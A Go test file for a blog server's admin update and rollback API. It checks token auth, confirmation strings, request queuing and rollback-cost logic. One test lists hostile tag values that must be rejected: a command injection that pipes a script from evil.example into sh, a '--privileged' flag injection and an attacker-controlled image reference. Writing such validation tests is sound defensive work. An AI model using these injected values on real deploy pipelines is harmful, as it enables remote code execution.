package api

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mneme-blog/mneme/server/internal/deploy"
)

func updateServer(t *testing.T, spoolDir string) *Server {
	t.Helper()
	cfg := testConfig()
	cfg.AdminToken = "s3cret"
	cfg.UpdateSpoolDir = spoolDir
	return &Server{
		cfg:     cfg,
		metrics: newMetrics(),
		updates: newUpdateChecker("v0.1.0", 4, false),
		spool:   deploy.NewSpool(spoolDir),
	}
}

func postAdmin(t *testing.T, srv *Server, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer s3cret")
	rec := httptest.NewRecorder()
	srv.Routes().ServeHTTP(rec, req)
	return rec
}

func TestUpdateEndpointsRequireAdminToken(t *testing.T) {
	srv := updateServer(t, t.TempDir())
	for _, path := range []string{"/admin/update", "/admin/update/rollback"} {
		req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(`{"confirm":"update"}`))
		rec := httptest.NewRecorder()
		srv.Routes().ServeHTTP(rec, req)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("POST %s without a token = %d, want 401", path, rec.Code)
		}
	}
	if rec := get(t, srv, "/admin/update", nil); rec.Code != http.StatusUnauthorized {
		t.Errorf("GET /admin/update without a token = %d, want 401", rec.Code)
	}
}

func TestUpdateQueuesRequest(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)

	rec := postAdmin(t, srv, "/admin/update", `{"confirm":"update","tag":"v0.3.0"}`)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("POST /admin/update = %d (%s), want 202", rec.Code, rec.Body)
	}

	body, err := os.ReadFile(filepath.Join(dir, "request.json"))
	if err != nil {
		t.Fatalf("no request written: %v", err)
	}
	var req deploy.Request
	if err := json.Unmarshal(body, &req); err != nil {
		t.Fatal(err)
	}
	if req.Action != deploy.ActionUpdate || req.Tag != "v0.3.0" {
		t.Fatalf("queued %+v", req)
	}
	if req.ID == "" {
		t.Error("request has no correlation id")
	}
}

// A main build (the dashboard's "Switch to main" channel) rides the same verb.
func TestUpdateQueuesMainBuild(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)

	rec := postAdmin(t, srv, "/admin/update", `{"confirm":"update","tag":"main-1a2b3c4"}`)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("POST /admin/update = %d (%s), want 202", rec.Code, rec.Body)
	}
	body, err := os.ReadFile(filepath.Join(dir, "request.json"))
	if err != nil {
		t.Fatalf("no request written: %v", err)
	}
	var req deploy.Request
	if err := json.Unmarshal(body, &req); err != nil {
		t.Fatal(err)
	}
	if req.Action != deploy.ActionUpdate || req.Tag != "main-1a2b3c4" {
		t.Fatalf("queued %+v", req)
	}
}

// The confirmation string is the guard against a stray authenticated request
// restarting the stack, so it is enforced server-side, not only in the UI.
func TestUpdateRequiresConfirmation(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)

	rec := postAdmin(t, srv, "/admin/update", `{"tag":"v0.3.0"}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("unconfirmed update = %d, want 400", rec.Code)
	}
	if _, err := os.Stat(filepath.Join(dir, "request.json")); !os.IsNotExist(err) {
		t.Fatal("an unconfirmed request must not be queued")
	}
}

// The tag becomes part of an image reference on the host. Nothing that could
// change which image is pulled, or add a flag, may get through.
func TestUpdateRejectsNonReleaseTags(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)

	for _, tag := range []string{
		"latest", "main", "", "v1.2",
		"ghcr.io/attacker/backdoor:v1.0.0",
		"v1.0.0 --privileged",
		"v1.0.0;curl evil.example|sh",
		"v1.0.0@sha256:deadbeef",
	} {
		body, _ := json.Marshal(map[string]string{"confirm": "update", "tag": tag})
		rec := postAdmin(t, srv, "/admin/update", string(body))
		if rec.Code != http.StatusBadRequest {
			t.Errorf("tag %q = %d, want 400", tag, rec.Code)
		}
		if _, err := os.Stat(filepath.Join(dir, "request.json")); !os.IsNotExist(err) {
			t.Fatalf("tag %q was queued", tag)
		}
	}
}

func TestUpdateConflictsWhileQueued(t *testing.T) {
	srv := updateServer(t, t.TempDir())

	if rec := postAdmin(t, srv, "/admin/update", `{"confirm":"update","tag":"v0.3.0"}`); rec.Code != http.StatusAccepted {
		t.Fatalf("first = %d", rec.Code)
	}
	if rec := postAdmin(t, srv, "/admin/update", `{"confirm":"update","tag":"v0.3.1"}`); rec.Code != http.StatusConflict {
		t.Fatalf("second = %d, want 409", rec.Code)
	}
}

func TestUpdateDisabledWithoutSpool(t *testing.T) {
	srv := updateServer(t, "")

	rec := postAdmin(t, srv, "/admin/update", `{"confirm":"update","tag":"v0.3.0"}`)
	if rec.Code != http.StatusServiceUnavailable {
		t.Fatalf("update without a spool = %d, want 503", rec.Code)
	}

	// The status endpoint still answers — the dashboard needs to know it is off.
	got := getUpdateStatus(t, srv)
	if got["enabled"] != false {
		t.Fatalf("enabled = %v, want false", got["enabled"])
	}
}

func TestRollbackNeedsARecordedPreviousVersion(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)

	if rec := postAdmin(t, srv, "/admin/update/rollback", `{"confirm":"rollback"}`); rec.Code != http.StatusBadRequest {
		t.Fatalf("rollback with no history = %d, want 400", rec.Code)
	}

	writeAgentState(t, dir, deploy.State{
		Phase: deploy.PhaseDone, Result: deploy.ResultSuccess,
		Installed: "v0.3.0", Previous: "v0.2.1", PreviousSchema: 4,
		BackupArchive: "mneme-20260801T120000Z.tar.gz",
	})
	if rec := postAdmin(t, srv, "/admin/update/rollback", `{"confirm":"rollback"}`); rec.Code != http.StatusAccepted {
		t.Fatalf("rollback with history = %d, want 202", rec.Code)
	}
}

func TestDeepRollbackNeedsAnArchive(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)
	writeAgentState(t, dir, deploy.State{Installed: "v0.3.0", Previous: "v0.2.1", PreviousSchema: 4})

	rec := postAdmin(t, srv, "/admin/update/rollback", `{"confirm":"rollback","deep":true}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("deep rollback without an archive = %d, want 400", rec.Code)
	}
}

// The rollback cost must be derived, not guessed: this build declares schema 4
// with no breaking migrations, so falling back to a release at schema 4 is an
// image swap. A previous release at schema 0 (unrecorded) stays "unknown".
func TestRollbackCostReported(t *testing.T) {
	dir := t.TempDir()
	srv := updateServer(t, dir)

	writeAgentState(t, dir, deploy.State{Installed: "v0.3.0", Previous: "v0.2.1", PreviousSchema: 4})
	rb := getUpdateStatus(t, srv)["rollback"].(map[string]any)
	if rb["available"] != true || rb["target"] != "v0.2.1" {
		t.Fatalf("rollback = %+v", rb)
	}
	if rb["cost"] != "fast" {
		t.Fatalf("cost = %v, want fast (no breaking migrations)", rb["cost"])
	}

	writeAgentState(t, dir, deploy.State{Installed: "v0.3.0", Previous: "v0.2.1"})
	rb = getUpdateStatus(t, srv)["rollback"].(map[string]any)
	if rb["cost"] != "unknown" {
		t.Fatalf("cost = %v, want unknown when the old schema was not recorded", rb["cost"])
	}
}

func TestRollbackCostFunction(t *testing.T) {
	cases := []struct {
		name                        string
		current, target, targetSafe int
		want                        string
	}{
		{"additive release", 4, 5, 0, "fast"},
		{"breaking at our head", 4, 5, 4, "fast"},
		{"breaking above our head", 4, 5, 5, "deep"},
		{"no manifest published", 4, 0, 0, "unknown"},
	}
	for _, c := range cases {
		if got := rollbackCost(c.current, c.target, c.targetSafe); got != c.want {
			t.Errorf("%s: rollbackCost(%d,%d,%d) = %q, want %q",
				c.name, c.current, c.target, c.targetSafe, got, c.want)
		}
	}
}

func getUpdateStatus(t *testing.T, srv *Server) map[string]any {
	t.Helper()
	rec := get(t, srv, "/admin/update", map[string]string{"Authorization": "Bearer s3cret"})
	if rec.Code != http.StatusOK {
		t.Fatalf("GET /admin/update = %d (%s)", rec.Code, rec.Body)
	}
	var out map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v", err)
	}
	return out
}

func writeAgentState(t *testing.T, dir string, st deploy.State) {
	t.Helper()
	body, err := json.Marshal(st)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "state.json"), body, 0o600); err != nil {
		t.Fatal(err)
	}
}
